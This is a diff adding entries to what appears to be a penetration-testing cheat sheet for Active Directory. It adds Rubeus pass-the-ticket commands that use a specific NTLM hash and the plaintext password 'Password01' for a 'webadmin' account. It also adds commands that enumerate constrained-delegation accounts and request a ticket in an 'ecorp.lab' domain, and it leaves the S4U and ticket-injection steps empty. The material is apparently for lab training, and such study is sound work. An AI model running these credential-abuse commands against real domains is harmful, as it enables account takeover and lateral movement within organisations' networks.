@@ -260,6 +260,11 @@ If functions not on remote host:-
 #### Rubeus Pass-the-ticket
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
+```Rubeus.exe asktgt /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /ptt```
+
+```Rubeus.exe asktgt /user:webadmin /password:Password01 /ptt```
+
+
 * * *
 
 # Mimikatz 
@@ -681,6 +686,25 @@ klist
 * * *
 
 # Constrained Delegation
+
+```Get-DomainUser –TrustedToAuth```
+
+```Get-DomainComputer –TrustedToAuth```
+
+Or using ActiveDirectory module:
+
+```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
+
+Request TGT:
+
+```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61```
+
+Using S4U and the previous TGT, request a TGS:
+
+Inject PTT:
+
+
+
 # Why wait when you can spool?
 https://github.com/leechristensen/SpoolSample
 
